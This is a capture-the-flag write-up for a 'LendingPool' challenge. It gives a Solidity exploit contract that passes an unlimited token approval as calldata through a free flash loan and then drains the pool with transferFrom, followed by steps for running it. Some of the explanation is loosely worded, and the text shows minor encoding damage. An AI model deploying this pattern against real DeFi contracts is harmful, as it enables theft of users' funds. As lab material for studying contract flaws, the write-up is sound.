# Challenge Title/Description

LendingPool

Welcome to the LendingPool challenge! In this challenge, you'll be diving into a pool that offers flash loans of CTF tokens for free. The pool currently holds a balance of 1 million CTF tokens, while you start with nothing. However, there's no need to worry â€“ you just might have what it takes to acquire them all from the pool.

# Write Up

Welcome to the LendingPool challenge! In this writeup, we'll explore a vulnerability in the LendingPool contract that can be exploited using a carefully crafted smart contract. Our goal is to gain unauthorized access to the pool's funds and claim them for ourselves.

Exploit Contract:

```c
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


import {LendingPool} from "./LendingPool.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";


contract LendingPoolExploit {
function attack(address _pool, address _token) public {
    LendingPool lendingPool = LendingPool(_pool);
    IERC20 token = IERC20(_token);


// call flashloan
    // call token.approve(exploit, 2 ** 256 - 1)
    bytes memory data = abi.encodeWithSignature("approve(address,uint256)",  address(this), 2 ** 256 - 1);


    lendingPool.flashLoan(0, msg.sender, _token, data);


    // token.transferFrom(pool, msg.sender, balance of pool)
    token.transferFrom(_pool, msg.sender, token.balanceOf(_pool));
}
}

```
Exploit Explanation:
- The exploit contract interacts with the vulnerable LendingPool contract to drain funds.
- It initiates the flashLoan function, allowing a borrower to temporarily borrow tokens, provided they pay them back along with a fee.
- The contract encodes an approval for itself to spend unlimited tokens from the pool.
- Upon executing the flashLoan function, the exploit contract's attack function is invoked, resulting in the attacker receiving tokens from the pool.

Execution:

To execute the exploit, follow these steps:

- Deploy the LendingPoolExploit contract.
- Run the attack function, passing the address of the vulnerable LendingPool contract and the address of the target token (CTF token) as arguments.
- The flashLoan function will be called, and the attacker contract will receive tokens from the pool.
- The transferFrom function is then invoked, transferring the remaining tokens from the pool to the attacker's address.
